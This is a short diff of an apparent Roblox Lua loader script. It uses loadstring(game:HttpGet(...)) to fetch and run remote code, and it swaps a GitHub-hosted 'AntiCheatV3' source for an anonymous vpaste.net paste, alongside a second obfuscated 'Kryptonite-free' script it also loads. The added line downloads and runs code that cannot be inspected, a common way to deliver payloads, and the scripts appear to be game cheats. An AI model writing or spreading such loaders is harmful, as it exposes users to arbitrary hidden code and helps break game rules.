@@ -1,5 +1,5 @@
 local function s()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaongLiaing/AntiCheatV3/refs/heads/main/v.lua"))()
+    loadstring(game:HttpGet("http://vpaste.net/R3o8w"))()
 end
 local function f()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Bitcoinlol/Kryptonite-free/refs/heads/main/Protected_5085813520974140.lua.txt", true))()
